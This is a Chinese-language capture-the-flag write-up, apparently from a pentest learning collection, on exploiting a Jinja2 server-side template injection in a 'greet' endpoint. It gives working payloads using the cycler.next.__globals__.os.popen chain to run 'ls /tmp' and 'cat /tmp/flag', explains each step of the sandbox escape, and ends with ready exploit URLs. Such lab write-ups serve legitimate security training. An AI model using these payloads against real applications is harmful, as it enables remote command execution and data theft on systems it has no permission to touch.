### 1. 题目描述

目标是利用服务器端模板注入（SSTI）漏洞读取服务器 `/tmp`​ 目录下的 flag 文件。该系统 `greet`​ 接口的 `name` 参数存在 SSTI 漏洞，且未做任何过滤，可直接使用经典 SSTI payload 执行系统命令，结合提示“/tmp”定位 flag 位置。

### 2. 知识点

- 服务器端模板注入（SSTI）漏洞原理（Jinja2 模板）
- SSTI 经典利用链（通过内置对象访问 `os` 模块执行命令）
- 系统命令执行（`ls`​ 查看目录、`cat` 读取文件）

### 3. 题目解题方法思路

核心是利用未过滤的 SSTI 漏洞构造经典利用链执行命令。直接通过 Jinja2 内置对象 `cycler`​ 为入口，逐层访问 `next`​ 方法→`__globals__`​ 全局命名空间→`os`​ 模块，先执行 `ls /tmp`​ 查看 `/tmp`​ 目录下的文件，确定 flag 文件名后，再执行 `cat /tmp/[flag文件名]` 读取 flag。工具仅需浏览器直接在 URL 中拼接 payload 测试。

### 4. 解题步骤

1. 访问目标页面 `http://ip32838`​，测试 SSTI 漏洞：在 URL 后拼接 `greet?name={{7*7}}`​，访问后页面显示“Hello, 49!”，确认 `name`​ 参数存在 SSTI 漏洞且无过滤。![image](D:\05-dev_home\AI_Pentest\xbow题解知识库\同学们解的题\x-bow markdown\new\X-076-24\exp.assets\image-x12175405-la8esvh.png)

   ![image](D:\05-dev_home\AI_Pentest\xbow题解知识库\同学们解的题\x-bow markdown\new\X-076-24\exp.assets\image-x12175506-smgo0ua.png)

2. 查看 `/tmp`​ 目录内容：构造 payload 执行 `ls /tmp`​ 命令，在 URL 后拼接 `greet?name={{cycler.next.__globals__.os.popen('ls /tmp').read()}}`​，访问后页面显示 `/tmp`​ 目录下的文件（含 flag 文件，如 `flag_tmp123`）。

   ---

   根据 hint 可知，FLAG 大概率在=/tmp

   ![image](D:\05-dev_home\AI_Pentest\xbow题解知识库\同学们解的题\x-bow markdown\new\X-076-24\exp.assets\image-x12174913-b9nrknq.png)

   /tmp 下有两个文件，

   ![image](D:\05-dev_home\AI_Pentest\xbow题解知识库\同学们解的题\x-bow markdown\new\X-076-24\exp.assets\image-x12175203-05g1shf.png)

3. 读取 flag 文件：根据目录结果，构造 payload 执行 `cat /tmp/[flag文件名]`​ 命令，在 URL 后拼接 `greet?name={{cycler.next.__globals__.os.popen('cat /tmp/flag').read()}}`​（将 `flag_tmp123` 替换为实际 flag 文件名）。

   直接查看 `/tmp/flag`

   ![image](D:\05-dev_home\AI_Pentest\xbow题解知识库\同学们解的题\x-bow markdown\new\X-076-24\exp.assets\image-x12175201-bvzdrly.png)

4. 访问后页面“Hello,” 后显示 flag 内容，提取即可。

‍


经典 Payload 就能解： `cycler.next.__globals__.os.popen('ls /tmp').read()`。

从内到外，从左到右解析：

**第一层：**​**​`cycler`​**

- `cycler`​ 是 **Jinja2 内置的一个全局对象**。它的主要用途是在循环中交替使用一系列值（例如循环变换表格行的颜色）。
- 攻击者本身并不关心 `cycler` 的功能，他们只是把它当作一个进入 Python 环境的“入口点”或“跳板”。因为它是 Jinja2 环境中的一个对象，所以可以直接访问。

**第二层：**​ **​`.next`​**

- `cycler`​ 对象有一个 `.next` 方法，调用它会返回循环中的下一个项。
- 关键点在于：**在 Jinja2 中，这个**  **​`.next`​**​ **方法是一个 Python 函数对象**。一旦我们获取了一个 Python 函数对象，我们就可以访问它的内部属性，这是整个利用链的核心。

**第三层：**​ **​`.__globals__`​** 

- 这是 **Python 函数对象的一个特殊属性**。
- `__globals__`​ 是一个字典，它引用了该函数所在 **模块的全局命名空间**。这个命名空间包含了该模块定义的所有全局变量、函数、类等。
- 通过访问 `.__globals__`，攻击者成功地从 Jinja2 的沙盒环境“逃逸”到了更底层的 Python 模块环境中。现在，他们可以访问大量强大的内置模块和函数。

**第四层：**​ **​`.os`​**

- `os` 是 Python 的一个标准库模块，它提供了大量与操作系统交互的函数（如执行命令、操作文件系统等）。
- 攻击者在 `__globals__`​ 字典中寻找 `os`​ 这个键。因为 `cycler`​ 是 Jinja2 的一部分，而 Jinja2 本身就是一个 Python 模块，它很可能在某个地方导入了 `os`​ 模块，所以 `os` 会存在于其全局命名空间中。

**第五层：**​ **​`.popen('ls /tmp')`​** 

- `os.popen()` 是一个用于执行操作系统命令并读取其输出的方法。
- `'ls /tmp'`​ 是要执行的命令。`ls`​ 是 Linux/macOS 下列出目录内容的命令，`/tmp`​ 是一个通常可写的临时目录。攻击者执行这个命令来探测 `/tmp` 目录下有什么文件，这通常是他们上传 Webshell 或读取 flag 文件的第一步。
- 这个方法会返回一个文件对象，其中包含了命令执行的结果。

**第六层：**​ **​`.read()`​** 

- 由于 `popen()`​ 返回的是一个文件对象，调用 `.read()` 方法会读取该命令的全部输出。
- 在 SSTI 的上下文中，`{{ ... }}`​ 会将这个读取的结果（即 `ls /tmp`​ 命令的输出）**直接渲染到最终返回给用户的 HTML 页面中**。这样，攻击者就能在浏览器中看到命令执行的结果。

### 5. exp（URL 拼接格式）

#### （1）查看 /tmp 目录

```
 http://ip32838/greet?name={{cycler.next.__globals__.os.popen('ls /tmp').read()}}
```

#### （2）读取 flag 文件（需替换文件名）

```
 http://ip32838/greet?name={{cycler.next.__globals__.os.popen('cat /tmp/[实际flag文件名]').read()}}
```

‍